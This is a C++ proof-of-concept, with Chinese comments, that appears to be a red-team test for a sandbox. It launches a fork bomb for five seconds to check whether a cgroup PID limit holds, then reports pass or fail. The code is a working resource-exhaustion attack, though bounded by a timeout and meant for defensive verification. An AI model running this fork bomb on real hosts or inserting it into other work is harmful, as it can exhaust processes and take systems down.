// POC-003: fork 炸弹 DoS（红队对抗用例）
//
// 攻击技术：疯狂 fork 子进程，耗尽 PID 和 CPU 资源
// 预期行为：cgroup pid 限制生效，fork 返回 EAGAIN，进程不会耗尽宿主
// 风险等级：High
//
// 编译：g++ -o redteam_poc_fork_bomb redteam_poc_fork_bomb.cpp
// 在沙盒内运行：timeout 5 ./redteam_poc_fork_bomb
// 预期：fork 在达到 cgroup pid 上限后失败，宿主不受影响

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <signal.h>
#include <time.h>
#include <errno.h>

static volatile int child_count = 0;
static volatile int max_children = 0;
static volatile int fork_failures = 0;

void sigchld_handler(int sig) {
    int status;
    while (waitpid(-1, &status, WNOHANG) > 0) {
        child_count--;
    }
}

int main() {
    printf("[POC-003] fork 炸弹 DoS 测试\n");
    printf("[POC-003] 预期：cgroup pid 限制在 ~256，fork 最终返回 EAGAIN\n");

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigchld_handler;
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, nullptr);

    time_t start = time(nullptr);
    int total_forks = 0;

    // fork 炸弹循环（5秒超时）
    while (time(nullptr) - start < 5) {
        pid_t pid = fork();
        if (pid < 0) {
            // fork 失败（预期：cgroup pid 限制）
            fork_failures++;
            if (fork_failures == 1) {
                printf("[POC-003] fork 首次失败: %s (已创建 %d 个子进程)\n",
                       strerror(errno), max_children);
            }
            if (fork_failures > 100) {
                printf("[POC-003] fork 持续失败 %d 次，cgroup pid 限制生效\n", fork_failures);
                break;
            }
            usleep(1000); // 短暂等待子进程退出
            continue;
        }

        if (pid == 0) {
            // 子进程：短暂存活后退出
            usleep(100000); // 100ms
            _exit(0);
        }

        // 父进程
        total_forks++;
        child_count++;
        if (child_count > max_children) {
            max_children = child_count;
        }

        // 防止父进程自己被 OOM 杀死前无输出
        if (total_forks % 100 == 0) {
            printf("[POC-003] 已 fork %d 次, 当前存活 %d, 最大 %d, 失败 %d\n",
                   total_forks, child_count, max_children, fork_failures);
        }
    }

    // 等待所有子进程退出
    printf("[POC-003] 等待子进程退出...\n");
    while (child_count > 0) {
        usleep(10000);
    }

    printf("[POC-003] 统计: 总fork=%d, 最大存活=%d, fork失败=%d\n",
           total_forks, max_children, fork_failures);

    if (fork_failures > 0 && max_children < 1000) {
        printf("[POC-003] ✅ cgroup pid 限制生效（最大存活 %d < 1000，fork 被限制）\n", max_children);
        return 0;
    } else if (max_children >= 1000) {
        printf("[POC-003] ❌ 安全漏洞：最大存活 %d >= 1000，cgroup pid 限制未生效\n", max_children);
        return 1;
    } else {
        printf("[POC-003] ⚠️  fork 未失败（可能时间不够或限制未配置）\n");
        return 0;
    }
}
